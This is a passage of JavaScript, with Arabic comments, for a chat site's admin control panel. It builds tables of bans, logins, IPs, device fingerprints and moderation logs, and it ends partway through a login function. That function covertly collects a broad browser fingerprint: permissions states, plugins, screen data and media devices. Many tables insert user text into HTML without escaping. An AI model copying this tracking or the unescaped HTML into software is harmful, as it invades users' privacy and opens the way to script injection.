                colorPickerInstance = new jscolor.color($(".sbuttons")[0], {});
                colorPickerInstance.fromString(commandPayload.site.buttons);

                // تفريغ وإعادة بناء صلاحيات الأيقونات الخاصة التفاعلية للأعضاء
                var specialIconsContainer = $(".p-sico");
                specialIconsContainer.children().remove();
                var tempIconsMap = {};
                var masterIconsArray = activeAlerts;

                if (masterIconsArray != null && masterIconsArray.length > 0) {
                    for (var k = 0; k < masterIconsArray.length; k++) {
                        tempIconsMap[masterIconsArray[k].ico + 'x'] = true; // ربط الأيقونات بالرتب لحفظها بالسيرفر
                    }
                }
                // تكرار لعرض الأيقونات الخاصة sico في لوحة التحكم وتلوين الزر بناءً على الصلاحية والتطابق
                $.each(commandPayload.sico, function (index, iconFileName) {
                    var iconElementNode = $("<div style=\"display:inline-block;padding:2px;margin:2px;margin-top:2px;\" class=\"border\"><img style=\"max-width:220px;max-height:32px;\"><a style=\"margin-left: 4px;padding:4px;\" onclick=\"del_ico(this);\" class=\"btn btn-" + (tempIconsMap[iconFileName + 'x'] ? "success" : "danger") + " fa fa-times\">.</a></div>");
                    iconElementNode.find("img").attr("src", "sico/" + iconFileName);
                    iconElementNode.find('a').attr("pid", "sico/" + iconFileName);
                    specialIconsContainer.append(iconElementNode); // حقن الأيقونة في الحاوية التابعة لها
                });

                // الانتقال لحاوية الدروع والهدايا التفاعلية p-dro3 وتفريغها وإعادة بنائها
                specialIconsContainer = $(".p-dro3");
                specialIconsContainer.children().remove();
                $.each(commandPayload.dro3, function (index, giftFileName) {
                    var giftElementNode = $("<div style=\"display:inline-block;padding:2px;margin:2px;margin-top:2px;\" class=\"border\"><img style=\"max-width:220px;max-height:32px;\"><a style=\"margin-left: 4px;padding:4px;\" onclick=\"del_ico(this);\" class=\"btn btn-danger fa fa-times\">.</a></div>");
                    giftElementNode.find("img").attr('src', "dro3/" + giftFileName);
                    giftElementNode.find('a').attr('pid', "dro3/" + giftFileName);
                    specialIconsContainer.append(giftElementNode);
                });

                // الانتقال لحاوية الفيسات والإيموجيات p-emo وتفريغها وإتاحة حقل ترتيب الأرقام
                specialIconsContainer = $(".p-emo");
                specialIconsContainer.children().remove();
                $.each(commandPayload.emo, function (index, emoFileName) {
                    var emoElementNode = $("<div style=\"display:inline-block;padding:2px;margin:2px;margin-top:2px;\" class=\"border\"><input style=\"width:48px;\" type=\"number\" value=\"" + (index + 1) + "\" onchange=\"emo_order();\"><img style=\"max-width:24px;max-height:24px;\"><a style=\"margin-left: 4px;padding:4px;\" onclick=\"del_ico(this);\" class=\"btn btn-danger fa fa-times\">.</a></div>");
                    emoElementNode.find('img').attr("src", "emo/" + emoFileName);
                    emoElementNode.find('a').attr("pid", "emo/" + emoFileName);
                    specialIconsContainer.append(emoElementNode);
                });

                // برمجة كليك زر حفظ الترتيب الجديد للفيسات emo_order وإرسال المصفوفة المرتبة للسيرفر
                $(".emo_order").off().click(function () {
                    var sortedEmosArray = $(".p-emo img").toArray().map(function (imgElement) {
                        return imgElement.src.split('/').pop(); // استخراج اسم ملف الفيس فقط من الرابط الكلي
                    });
                    send('cp', {
                        'cmd': "emo_order",
                        'd': sortedEmosArray
                    });
                });
                break;

            case "ico+":
                // حدث إضافة ورفع أيقونة أو فيس جديد بنجاح من لوحة الإدارة
                var pathSegments = commandPayload.split('/');
                var specialIconsContainer = $(".p-" + pathSegments[0]); // تحديد الحاوية تلقائياً (emo أو sico أو dro3)

                if (pathSegments[0] == "emo") {
                    // إذا كان المرفوع فيساً، يتم بناء حقل رقم الترتيب تلقائياً وإضافته
                    var newEmoNode = $("<div style=\"display:inline-block;padding:2px;margin:2px;margin-top:2px;\" class=\"border\"><input style=\"width:48px;\" type=\"number\" value=\"" + (specialIconsContainer.find('div').length + 1) + "\" onchange=\"emo_order();\"><img style=\"max-width:24px;max-height:24px;\"><a style=\"margin-left: 4px;padding:4px;\" onclick=\"del_ico(this);\" class=\"btn btn-danger fa fa-times\">.</a></div>");
                    newEmoNode.find("img").attr("src", commandPayload);
                    newEmoNode.find('a').attr("pid", commandPayload);
                    newEmoNode.find('span').text(specialIconsContainer.find("img").length);
                    specialIconsContainer.append(newEmoNode);
                } else {
                    // الأيقونات العادية والدروع يتم إضافتها مباشرة بدون حقل ترقيم
                    var newIconNode = $("<div style=\"display:inline-block;padding:2px;margin:2px;margin-top:2px;\" class=\"border\"><img style=\"max-width:24px;max-height:24px;\"><a style=\"margin-left: 4px;padding:4px;\" onclick=\"del_ico(this);\" class=\"btn btn-danger fa fa-times\">.</a></div>");
                    newIconNode.find("img").attr("src", commandPayload);
                    newIconNode.find('a').attr("pid", commandPayload);
                    specialIconsContainer.append(newIconNode);
                }
                break;

            case "ico-":
                // حدث حذف الأيقونة أو الفيس فوراً من المتصفح عند إزالتها بواسطة معرّف المسار pid
                $("a[pid='" + commandPayload + "']").parent().remove();
                break;

            case "cp_msgs":
                // لوحة إدارة رسائل الترحيب الآلية التلقائية وبوتات الترحيب بالشات (Welcome & Auto Messages)
                $("#msgs .tablesorter").remove();
                var msgsTableNode = buildTableHtmlElement("التصنيف,العنوان,الرساله,".split(','));
                $("#msgs").append(msgsTableNode);

                $.each(commandPayload, function (index, msgConfigObj) {
                    // بناء زر حذف الرسالة التلقائية وربطه بأمر السيرفر msgsdel
                    var deleteMsgBtnHtml = "<a class='btn btn-danger fa fa-times' onclick=\"send('cp',{cmd:'msgsdel',id:'" + msgConfigObj.id + "'});$(this).remove();\"></a>";

                    // تصنيف نوع الرسالة (إذا كانت w تعني ترحيب العضو عند الدخول، وإلا فهي رسالة آلية دورية)
                    appendTableRow(msgsTableNode, [msgConfigObj.type == 'w' ? "الترحيب" : "الرسائل", msgConfigObj.t, msgConfigObj.m, deleteMsgBtnHtml], [0x5a, 0x8c, 0x118, 80]);
                });

                // تحديث وتنسيق حجم جدول الرسائل وتقليمه لونياً بشكل تبادلي ومتناسق
                $("#msgs .tablesorter").trigger("update").css("width", "380px").find("tbody tr").css("max-width", "120px");
                $(".tablesorter").each(function (tableIdx, tableElement) {
                    $(tableElement).find('tr').each(function (rowIdx, rowElement) {
                        if (rowIdx / 2 == Math.ceil(rowIdx / 2)) {
                            $(rowElement).css("background-color", "#fffafa");
                        } else {
                            $(rowElement).css("background-color", "#fafaff");
                        }
                    });
                });
                break;
            case "cp_subs":
                // لوحة إدارة الاشتراكات، العضويات الممتازة ورتب الـ VIP المحمية (VIP & Subscriptions)
                $("#subs .tablesorter").remove();
                var subsTableNode = buildTableHtmlElement("الإشتراك,العضو,الزخرفه,المده,المتبقي,اخر تواجد,".split(','));
                $("#subs").append(subsTableNode);
                var subsTableRowsHtml = '';

                // فرز وترتيب مصفوفة الاشتراكات تصاعدياً وتنازلياً بناءً على مستوى الرتبة والـ Rank
                commandPayload = commandPayload.sort(function (subA, subB) {
                    return subB.rank - subA.rank;
                });
                var currentTimestamp = new Date().getTime();
                commandPayload = commandPayload.sort(function (subA, subB) {
                    return ('[' + parseUserPowerString(subB.power).rank.toString().padStart(4, '0') + "] " + subB.power).localeCompare('[' + parseUserPowerString(subA.power).rank.toString().padStart(4, '0') + "] " + subA.power);
                });

                $.each(commandPayload, function (index, subUserObj) {
                    // احتساب الأيام المتبقية لانتهاء اشتراك الرتبة VIP
                    if (subUserObj.end > 0) {
                        subUserObj.end = Math.ceil((subUserObj.end - currentTimestamp) / 86400000) - 1;
                    }
                    // صياغة مدة الاشتراك (إذا كانت أيام محددة أو دائم)
                    if (subUserObj.days || false) {
                        subUserObj.days = "يوم " + subUserObj.days;
                    } else {
                        subUserObj.days = "دائم";
                    }
                    // احتساب مدة غياب العضو بالأيام منذ آخر تواجد له بالشات
                    subUserObj.ls = (currentTimestamp - subUserObj.ls) / 86400000;

                    // إنشاء زر سحب الرتبة والإلغاء (X) وتوجيه أمر setpower للسيرفر، وزر التعديل التروس التابع لدالة cp_ledit
                    var subActionsBtnHtml = "<a class='btn btn-primary fa fa-times' onclick=\"send('cp', { cmd: 'setpower', id: '" + subUserObj.id + "', days: 0, power: '' });$(this).remove();\"></a><a class='btn btn-danger fa fa-gear' onclick=\"cp_ledit(this,'" + subUserObj.id + "');\"></a>";

                    subsTableRowsHtml += buildTableRowHtml([
                        '[' + parseUserPowerString(subUserObj.power).rank.toString().padStart(4, '0') + "] " + subUserObj.power,
                        subUserObj.user,
                        subUserObj.topic,
                        subUserObj.days,
                        subUserObj.end == 0 ? '' : subUserObj.end.toString().padStart(2, '0'),
                        subUserObj.ls.toFixed(0).toString().padStart(2, '0'),
                        subActionsBtnHtml
                    ], [0xc8, 0x5a, 120, 80, 80, 80, 80]);
                });

                subsTableNode.find("tbody").html(subsTableRowsHtml);
                $("#subs .tablesorter").trigger("update");
                break;

            case "cp_shrt":
                // لوحة إدارة اختصارات النصوص والرموز التلقائية للشات (Chat Shortcuts Panel)
                $("#shrt .tablesorter").remove();
                var shortcutsTableNode = buildTableHtmlElement("الإختصار,الزخرفه,حذف".split(','));
                $("#shrt").append(shortcutsTableNode);

                $.each(commandPayload, function (index, shortcutObj) {
                    // زر حذف الاختصار وتمرير أمر shrtdel للسيرفر
                    var deleteShortcutBtnHtml = "<a class='btn btn-danger fa fa-times' onclick='send(\"cp\",{cmd:\"shrtdel\",name:\"" + shortcutObj.name + "\"});$(this).remove();'></a>";
                    appendTableRow(shortcutsTableNode, [shortcutObj.name, shortcutObj.value, deleteShortcutBtnHtml], [80, 0x190, 80]);
                });

                $("#shrt .tablesorter").trigger("update");

                // تلوين وتقليم أسطر جدول الاختصارات بشكل تبادلي ومتناسق لراحة العين
                $(".tablesorter").each(function (tableIdx, tableElement) {
                    $(tableElement).find('tr').each(function (rowIdx, rowElement) {
                        if (rowIdx / 2 == Math.ceil(rowIdx / 2)) {
                            $(rowElement).css("background-color", "#fffafa");
                        } else {
                            $(rowElement).css("background-color", "#fafaff");
                        }
                    });
                });
                break;

            case "cp_fltr":
                // لوحة إدارة فلتر الكلمات والشتائم المحظورة والمنع التلقائي (Word Filter System)
                $("#cp #fltr .tablesorter").remove();
                var filterTableNode = buildTableHtmlElement("التصنيف,الكلمه,حذف".split(','));
                $("#cp #fltr").append(filterTableNode);

                // الفئة (a): عرض قائمة الكلمات المضافة للفلتر حالياً مع زر الحذف والأمر fltrdel
                $.each(commandPayload.a, function (index, filterObj) {
                    var deleteFilterBtnHtml = "<a class='btn btn-danger fa fa-times' onclick='send(\"cp\",{cmd:\"fltrdel\",path:\"" + filterObj.path + "\",id:\"" + filterObj.id + "\"});$(this).parent().parent().remove();'></a>";
                    appendTableRow(filterTableNode, [filterObj.type, filterObj.v, deleteFilterBtnHtml], [0x5a, 0x12c, 80]);
                });

                $("#cp #fltr .tablesorter").trigger("update");
                $("#cp .tablesorter").each(function (tableIdx, tableElement) {
                    $(tableElement).find('tr').each(function (rowIdx, rowElement) {
                        if (rowIdx / 2 == Math.ceil(rowIdx / 2)) {
                            $(rowElement).css("background-color", "#fffafa");
                        } else {
                            $(rowElement).css("background-color", "#fafaff");
                        }
                    });
                });

                // الفئة (b): عرض قائمة تقارير الكلمات التي تم اصطيادها ومنعها من الأعضاء في الواجهة ومطابقتها #fltred
                $("#fltred").html('');
                for (var i = commandPayload.b.length - 1; i != -1; i--) {
                    var caughtLogItem = commandPayload.b[i];
                    // بناء قالب تقرير الكلمة المحجوبة (الكلمة، النص الكامل، العضو الكاتب، الآيبي IP، وزر الحذف fltrdelx)
                    $("#fltred").append("<div class=\"fl\" style=\"width:100%;\"><span onclick=\"send('cp',{cmd:'fltrdelx',id:'" + caughtLogItem.id + "'});$(this).parent().remove();\" class=\"fl btn btn-danger fa fa-times\" style=\"padding:3px 8px;\"></span><span class=\"fl label label-primary\">الكلمه</span>" + caughtLogItem.v + "<br><div class=\"fl border\" style=\"width:100%;\">" + caughtLogItem.msg + "<br>user: " + caughtLogItem.topic.split('&').join("&amp;") + "<br>IP: " + caughtLogItem.ip + "</div><br></div>");
                }
                break;
            case "cp_bans":
                // لوحة إدارة وفك حظر الأعضاء داخل الكنترول (Bans Control Panel)
                $("#bans .tablesorter").remove();
                var bansTableNode = buildTableHtmlElement("العضو,الحظر,ينتهي في,الحالات,آخر حاله,".split(','));
                $("#bans").append(bansTableNode);

                $.each(commandPayload, function (index, banItemObj) {
                    // إنشاء زر فك الحظر الفوري (X) وإرسال أمر unban للسيرفر مع زر البحث عن البصمة لربط الآيبي
                    var banActionsBtnHtml = "<a class='btn btn-danger fa fa-times' onclick='send(\"cp\",{cmd:\"unban\",id:\"" + banItemObj.id + "\"});$(this).parent().parent().remove();'></a>";
                    banActionsBtnHtml += "<a class='btn btn-info fa fa-search' onclick=\"$(`#cp a[href='#fps']`).click();$('#fps input').val('" + banItemObj.type.replace(/"/g, '').replace(/'/g, '') + "').trigger('change');\"></a>";

                    appendTableRow(bansTableNode, [banItemObj.user, banItemObj.type, banItemObj.date, banItemObj.co, banItemObj.lc, banActionsBtnHtml], [80, 0xbe, 120, 0x54]);
                });

                $("#bans .tablesorter").trigger("update");

                // تلوين أسطر جدول الحظر بشكل تبادلي ومتناسق لراحة عين طاقم الإشراف والمدراء
                $(".tablesorter").each(function (tableIdx, tableElement) {
                    $(tableElement).find('tr').each(function (rowIdx, rowElement) {
                        if (rowIdx / 2 == Math.ceil(rowIdx / 2)) {
                            $(rowElement).css("background-color", "#fffafa");
                        } else {
                            $(rowElement).css("background-color", "#fafaff");
                        }
                    });
                });
                break;

            case "cp_logins":
                // لوحة فحص وسجل الحسابات والعضويات المسجلة في الشات (Logins & Accounts Database)
                $("#logins .tablesorter").remove();
                var loginsTableNode = buildTableHtmlElement(["العضو", "الزخرفه", "الآي بي", "الجهاز", "صلاحيات", "لايكات", "آخر تواجد", "التسجيل", '']);

                // استخراج مصفوفة التحكم بالصفحات (Pagination Info) الممررة في آخر عنصر
                var paginationData = commandPayload[commandPayload.length - 1];
                commandPayload.splice(commandPayload.length - 1, 1); // إزالتها للاحتفاظ ببيانات الحسابات فقط
                paginationData.d = new Date(paginationData.d).getTime();

                $("#logins").append(loginsTableNode);

                $.each(commandPayload, function (index, accountObj) {
                    // معالجة وتنسيق تاريخ تسجيل العضوية بصيغة (السنة/الشهر/اليوم)
                    var parsedRegDate = new Date(accountObj.regdate);
                    var regMonth = parsedRegDate.getMonth() + 1;
                    var regDay = parsedRegDate.getDate();
                    var regYear = parsedRegDate.getFullYear();
                    var formattedRegDateString = regYear + '/' + regMonth + '/' + regDay;

                    // إنشاء أزرار إدارة الحساب (البحث في بصمات الجهاز عبر دالة cp_fps وزر إعدادات تعديل رتبة الحساب التابع لـ cp_ledit)
                    var accountActionsBtnHtml = "<a class=\"btn btn-primary fa fa-search\" onclick=\"cp_fps(this,'" + accountObj.fp.replace(/"/g, '').replace(/'/g, '') + "',true);\"></a>";
                    accountActionsBtnHtml += "<a class='btn btn-danger fa fa-gear' onclick=\"cp_ledit(this,'" + accountObj.id + "');\"></a>";

                    appendTableRow(loginsTableNode, [
                        accountObj.u, // اسم المستخدم الأساسي
                        accountObj.t, // الزخرفة
                        accountObj.ip, // عنوان الآيبي
                        accountObj.fp, // بصمة المتصفح (Fingerprint)
                        accountObj.power, // رتبة وصلاحية الحساب الحالية
                        formatLargeNumber(accountObj.rep), // إجمالي لايكات السمعة
                        new Date(paginationData.d - accountObj.lastseen).getTime().time(), // الوقت المنقضي منذ آخر تسجيل دخول
                        formattedRegDateString, // تاريخ التسجيل النهائي
                        "<div class=\"d-flex\">" + accountActionsBtnHtml + "</div>" // صندوق أزرار التحكم
                    ], [80, 120, 120, 0xc2, 120, 80, 0x46, 0x46, 0x9a]);
                });

                // برمجة أزرار التنقل بين صفحات السجل (التالي والسابق) لجلّب 100 عضوية في كل صفحة تلقائياً عبر أمر السيرفر logins
                $("#logins .fa-arrow-right").text((paginationData.i + 100).toString()).attr("onclick", "send('cp',{cmd:'logins',q:$('#logins input').val(),i:" + (paginationData.i + 100) + "});$('#logins .fa').attr('disabled',true);").removeAttr("disabled");
                $("#logins .fa-arrow-left").text(Math.max(0, paginationData.i).toString()).attr("onclick", "send('cp',{cmd:'logins',q:$('#logins input').val(),i:" + Math.max(0, paginationData.i - 100) + "});$('#logins .fa').attr('disabled',true);");

                if (paginationData.i > 0) {
                    $("#logins .fa-arrow-left").removeAttr("disabled");
                } else {
                    $("#logins .fa-arrow-left").attr("disabled", true);
                }

                $("#logins .tablesorter").trigger("update");

                // تطبيق تنسيق تبادل الألوان لجدول الحسابات والمسجلين
                $(".tablesorter").each(function (tableIdx, tableElement) {
                    $(tableElement).find('tr').each(function (rowIdx, rowElement) {
                        if (rowIdx / 2 == Math.ceil(rowIdx / 2)) {
                            $(rowElement).css("background-color", "#fffafa");
                        } else {
                            $(rowElement).css("background-color", "#fafaff");
                        }
                    });
                });
                break;
            case "cp_fps":
                // لوحة فحص ومراقبة بصمات الأجهزة والآيبي للزوار والمتصلين (Fingerprints & Devices Tracker)
                $("#fps .tablesorter").remove();
                var fpsTableNode = buildTableHtmlElement("الحاله,العضو,الزخرفه,الآي بي,الدوله,الجهاز,المصدر,الدعوة,الوقت,".split(','));

                // استخراج وتصفية مصفوفة التحكم بالصفحات لقائمة البصمات (Pagination Info)
                var fpsPaginationData = commandPayload[commandPayload.length - 1];
                commandPayload.splice(commandPayload.length - 1, 1);

                // ترتيب البصمات تنازلياً من الأحدث إلى الأقدم بناءً على وقت الدخول created
                commandPayload.sort(function (itemA, itemB) {
                    return itemB.created - itemA.created;
                });
                fpsPaginationData.d = new Date(fpsPaginationData.d).getTime();
                $("#fps").append(fpsTableNode);

                $.each(commandPayload, function (index, fpItemObj) {
                    // بناء زر البحث الفوري لتصفية كافة الحسابات التي تحمل نفس البصمة عبر دالة cp_fps
                    var searchFpBtnHtml = "<button class=\"btn btn-primary fa fa-search\" onclick=\"cp_fps(this,'" + fpItemObj.fp.replace(/"/g, '').replace(/'/g, '') + "');\"></button>";

                    appendTableRow(fpsTableNode, [
                        fpItemObj.isreg, // حالة الحساب (عضو مسجل أم زائر)
                        fpItemObj.username, // الاسم الأصلي
                        fpItemObj.topic, // الزخرفة ولون الاسم
                        fpItemObj.ip, // عنوان الآيبي
                        fpItemObj.co, // كود الدولة (العلم)
                        fpItemObj.fp, // كود بصمة الجهاز
                        fpItemObj.refr || '', // مصدر الدخول (الموقع المحول منه)
                        fpItemObj.r || '', // كود رابط الدعوة إن وجد
                        new Date(fpsPaginationData.d - fpItemObj.created).getTime().time(), // الوقت المنقضي منذ دخول هذا الجهاز للشات
                        searchFpBtnHtml // زر البحث والمطابقة
                    ], [80, 80, 120, 120, 80, 0xc2, 0xa0, 120, 100, 0x3c]);
                });

                $("#fps .tablesorter").trigger("update");

                // برمجة أزرار التصفح لصفحات السجل (التالي والسابق) لجلب 200 نتيجة بصمة جديدة تلقائياً عبر أمر السيرفر fps
                $("#fps .fa-arrow-right").text((fpsPaginationData.i + 0xc8).toString()).attr("onclick", "send('cp',{cmd:'fps',q:$('#fps input').val(),i:" + (fpsPaginationData.i + 0xc8) + "});$('#fps .fa').attr('disabled',true);").removeAttr("disabled");
                $("#fps .fa-arrow-left").text(Math.max(0, fpsPaginationData.i).toString()).attr("onclick", "send('cp',{cmd:'fps',q:$('#fps input').val(),i:" + Math.max(0, fpsPaginationData.i - 0xc8) + "});$('#fps .fa').attr('disabled',true);");

                if (fpsPaginationData.i > 0) {
                    $("#fps .fa-arrow-left").removeAttr("disabled");
                } else {
                    $("#fps .fa-arrow-left").attr("disabled", true);
                }
                break;

            case "cp_actions":
                // لوحة سجل العمليات الإشرافية لمراقبة طرد وحظر وعقوبات المراقبين (Admin Actions Log)
                $("#actions .tablesorter").remove();
                var actionsTableNode = buildTableHtmlElement(["الحاله", "العضو", "العضو الثاني", "الغرفه", "الاي بي", "الوقت"]);

                // استخراج وتصفية بيانات التحكم بالصفحات لسجل العمليات الإشرافية
                var actionsPaginationData = commandPayload[commandPayload.length - 1];
                commandPayload.splice(commandPayload.length - 1, 1);
                actionsPaginationData.d = new Date(actionsPaginationData.d).getTime();

                // ترتيب السجل تنازلياً لرؤية آخر العمليات والعقوبات فور حدوثها
                commandPayload.sort(function (actionA, actionB) {
                    return actionB.created - actionA.created;
                });
                $("#actions").append(actionsTableNode);

                $.each(commandPayload, function (index, actionLogObj) {
                    // حقن سطر العملية (نوع العقوبة كطرد أو حظر، المشرف المنفذ، العضو المتأثر، الغرفة المتأثرة، آيبي العملية والوقت)
                    appendTableRow(actionsTableNode, [
                        actionLogObj.type, // نوع الإجراء (طرد، كتم، حظر...)
                        actionLogObj.u1, // اسم المشرف المنفذ للإجراء
                        actionLogObj.u2, // اسم العضو المستهدف بالدستور والعقوبة
                        actionLogObj.room, // غرفة الشات التي حدث بها الإجراء
                        actionLogObj.ip || '', // الآيبي الخاص بالعملية
                        new Date(actionsPaginationData.d - actionLogObj.created).getTime().time() // الوقت الدقيق لحدوث العقوبة
                    ], [100, 0x82, 0xe6, 0x82, 0x82, 0x82]);
                });

                // برمجة أزرار التنقل للصفحات (التالي والسابق) لسجل العمليات لجلب 200 عملية رقابية إضافية عبر أمر السيرفر actions
                $("#actions .fa-arrow-right").text((actionsPaginationData.i + 0xc8).toString()).attr("onclick", "send('cp',{cmd:'actions',q:$('#actions input').val(),i:" + (actionsPaginationData.i + 0xc8) + "});$('#actions .fa').attr('disabled',true);").removeAttr("disabled");
                $("#actions .fa-arrow-left").text(Math.max(0, actionsPaginationData.i).toString()).attr("onclick", "send('cp',{cmd:'actions',q:$('#actions input').val(),i:" + Math.max(0, actionsPaginationData.i - 0xc8) + "});$('#actions .fa').attr('disabled',true);");

                if (actionsPaginationData.i > 0) {
                    $("#actions .fa-arrow-left").removeAttr("disabled");
                } else {
                    $("#actions .fa-arrow-left").attr("disabled", true);
                }

                // تطبيق آلية تقليم وتناوب الألوان لأسطر جدول العمليات لتبسيط القراءة الإدارية
                $(".tablesorter").each(function (tableIdx, tableElement) {
                    $(tableElement).find('tr').each(function (rowIdx, rowElement) {
                        if (rowIdx / 2 == Math.ceil(rowIdx / 2)) {
                            $(rowElement).css("background-color", "#fffafa");
                        } else {
                            $(rowElement).css("background-color", "#fafaff");
                        }
                    });
                });

                $("#actions .tablesorter").trigger("update");
                break;
            case "cp_sico":
                // لوحة تصفح واختيار الأيقونة الخاصة للأعضاء من الكنترول (Admin Special Icon Picker)
                var currentSelectionBox = $(".selbox").val();
                var specialIconsList = commandPayload;
                $("#cp .sico").children().remove(); // تنظيف قائمة الأيقونات الحالية

                $.each(specialIconsList, function (index, iconFileName) {
                    var iconImageNode = $("<img src=\"sico/" + iconFileName + "\" style=\"max-height:32px;max-width:100%;margin:4px;padding:4px;\">");

                    // عند النقر على الأيقونة يتم تمييزها ببرواز وتحديث حقل النص 'ico' باسم ملف الأيقونة المختار
                    iconImageNode.click(function () {
                        $(this).parent().find('img').removeClass("unread border");
                        $(this).addClass("unread border");
                        $("#cp input[name='ico']").val($(this).attr("src").split('/').pop());
                    });

                    // إذا كان العضو المستهدف يملك هذه الأيقونة مسبقاً، يتم وضع برواز التحديد عليها تلقائياً
                    if (userPermissionsConfig != null && userPermissionsConfig.ico == iconFileName) {
                        iconImageNode.addClass("unread border");
                    }
                    $("#cp .sico").append(iconImageNode);
                });
                break;

            case "cp_domains":
                // نظام إدارة وربط النطاقات والدومينات المتعددة التابعة للشات (Multi-Domain System Control)
                cachedDomainsList = commandPayload;
                var domainSelectMenu = $("#cp #domain_list");
                domainSelectMenu.children().remove(); // تفريغ قائمة النطاقات القديمة

                // توليد خيارات الـ Option بداخل قائمة اختيار الدومينات التلقائية
                for (var domainKey in cachedDomainsList) {
                    var domainOptionNode = $("<option></option>");
                    domainOptionNode.attr("value", domainKey);
                    domainOptionNode.text(domainKey);
                    domainSelectMenu.append(domainOptionNode);
                }

                var emptyOptionNode = $("<option></option>");
                emptyOptionNode.attr("value", '');
                emptyOptionNode.text('');
                domainSelectMenu.prepend(emptyOptionNode);

                // عند تغيير الدومين المختار، يتم تعبئة كافة إعداداته وتعديل ألوان السيم الخاص به
                domainSelectMenu.off().on("change", function (event) {
                    var selectedDomainObj = cachedDomainsList[domainSelectMenu.val()];

                    // تعبئة حقول الدومين (العنوان، الوصف، الكلمات الدلالية، وأكواد الهيدر والـ Script)
                    $("#domain").val(selectedDomainObj ? selectedDomainObj.domain : '');
                    $("#domain_name").val(selectedDomainObj ? selectedDomainObj.name : '');
                    $("#domain_title").val(selectedDomainObj ? selectedDomainObj.title : '');
                    $("#domain_description").val(selectedDomainObj ? selectedDomainObj.description : '');
                    $("#domain_keywords").val(selectedDomainObj ? selectedDomainObj.keywords : '');
                    $("#domain_scr").val(selectedDomainObj ? selectedDomainObj.script : '');

                    // موازنة وتلوين منتقي الألوان الخاص بالدومين المستهدف عبر مكتبة jscolor
                    var domainColorPicker = new jscolor.color($("#cp .domain_sbg")[0], {});
                    domainColorPicker.fromString(selectedDomainObj ? selectedDomainObj.bg : "#39536E");

                    domainColorPicker = new jscolor.color($("#cp .domain_sbackground")[0], {});
                    domainColorPicker.fromString(selectedDomainObj ? selectedDomainObj.background : "#fafafa");

                    domainColorPicker = new jscolor.color($("#cp .domain_sbuttons")[0], {});
                    domainColorPicker.fromString(selectedDomainObj ? selectedDomainObj.buttons : "#2B3E52");

                    // كشف حالة ربط الدومين مع استضافة جوال هوست وعرض لون الحالة (أحمر، برتقالي، أخضر)
                    if (selectedDomainObj) {
                        $("#domain_status").text("يتطلب موافقه من جوال هوست,النطاق مستخدم من موقع آخر,فعال".split(',')[selectedDomainObj.status]).css("color", ["red", "orange", "green"][selectedDomainObj.status]);
                    } else {
                        $("#domain_status").text('').css("color", "black");
                    }
                });

                domainSelectMenu.trigger("change");

                // مراقبة حقل نص الدومين للتأكد من صياغته بشكل صحيح وتلوينه بالأحمر في حال وجود رموز خاطئة
                $("#domain").on("input", function () {
                    if (sanitizeIncomingText($("#domain").val()) != $("#domain").val()) {
                        $("#domain").css("color", 'red');
                    } else {
                        $("#domain").css("color", '');
                    }
                });
                break;
        }
        // إغلاق جملة الـ Try واصطياد الأخطاء البرمجية (Catch Block) لطباعتها بالكونسول d2
    } catch (errorException) {
        console.error(errorException.stack);
        if (getCookieValue("debug") == '1') {
            alert(commandName + "\n" + errorException.stack); // إظهار أليرت بالخطأ الفعلي للمدير إذا كان وضع الـ debug مفعلاً
        }
    }
}
var cachedDomainsList = {};
var globalAlertOffsetTracker = 0;
var isLoginActionTriggered = false;

// دالة استخراج النص الصافي من حقول الـ HTML واستبدال الفيسات/الصور بنصوص الـ Alt البديلة لها
function stripHtmlTags(htmlElement) {
    $.each(htmlElement.find("img"), function (index, imgElement) {
        var altText = $(imgElement).attr("alt");
        if (altText != null) {
            $("<x>" + altText + "</x>").insertAfter($(imgElement));
        }
        $(imgElement).remove(); // إزالة عنصر الصورة بعد استخراج النص
    });
    return $(htmlElement).text();
}

// دالة تفتيح أو تغميق ألوان الهكس (Hex Color) لإنشاء تأثير الظلال التلقائي بالواجهة
function generateColorShade(hexColor, shadeAmount) {
    try {
        return (hexColor.indexOf('#') == 0 ? '#' : '') + hexColor.replace(/^#/, '').replace(/../g, doubleHexChar => ('0' + Math.min(0xff, Math.max(0, parseInt(doubleHexChar, 0x10) + shadeAmount)).toString(0x10)).substr(-2));
    } catch (e) {
        return "#000000";
    }
}

// دالة إرسال طلب تسجيل الدخول أو التسجيل وتجميع بصمة جهاز المستخدم الشاملة (Device Fingerprint)
function login(actionTypeCode) {
    if (isSocketConnected == false || isStreamActive == false) {
        return; // منع المتابعة إذا كان السوكت غير متصل تماماً بالسيرفر
    }
    $("#tlogins button").attr("disabled", "true"); // قفل أزرار واجهة تسجيل الدخول لمنع التكرار

    if (isLoginActionTriggered == false) {
        isLoginActionTriggered = true;

        // حفظ وتخزين بيانات التتبع ومواقع الإحالة ورابط الدعوة r في الكوكيز والـ LocalStorage
        if (getv("refr") == '') {
            setv("refr", getSanitizedReferrer() || '*');
        }
        if (getv('r') == '') {
            setv('r', getCookieValue('r') || '*');
        }

        executeSecondarySetup();

        // كتل حقن واصطياد مواصفات المتصفح والجهاز العميقة لإرسالها في مصفوفة navigator.n للسيرفر
        try {
            navigator.n = navigator.n || {};
            navigator.n.pri = pri();
            navigator.n.tz = new Date().getTimezoneOffset(); // جلب فارق التوقيت للدولة (Timezone Offset)
            navigator.n.screen = {};

            // سحب كامل إعدادات وأبعاد شاشة جهازك (العرض، الارتفاع، عمق الألوان)
            for (var screenKey in window.screen) {
                navigator.n.screen[screenKey] = window.screen[screenKey];
            }
            navigator.n.devicePixelRatio = window.devicePixelRatio;

            // فحص واختبار حالة أذونات وصلاحيات المتصفح (الكاميرا، المايك، الموقع، الإشعارات، الحافظة)
            var permissionsList = ["accelerometer", "camera", "clipboard-read", "clipboard-write", "geolocation", "background-sync", "magnetometer", "midi", "notifications", "payment-handler", "persistent-storage"];
            navigator.n.prl = ['x'];
            permissionsList.forEach(function (permissionName) {
                try {
                    navigator.permissions.query({
                        'name': permissionName
                    }).then(function (permissionStatus) {
                        navigator.n.prl.push(permissionName + '_' + permissionStatus.state);
                    })["catch"](function () {});
                } catch (e) {}
            });

            // تجميع أسماء الإضافات المثبتة (Plugins) والـ MimeTypes المدعومة بالمتصفح
            try {
                navigator.n.pl = Object.keys(navigator.plugins || {}).map(function (pluginIdx) {
                    return navigator.plugins[pluginIdx].name;
                });
                navigator.n.mt = Object.keys(navigator.mimeTypes || {}).map(function (mimeIdx) {
                    return navigator.mimeTypes[mimeIdx].type;
                });

                // جلب وحصر أجهزة ومستشعرات المايك والصوت المربوطة بجهاز الكمبيوتر أو الموبايل حالياً
                navigator.mediaDevices.enumerateDevices().then(function (devicesList) {
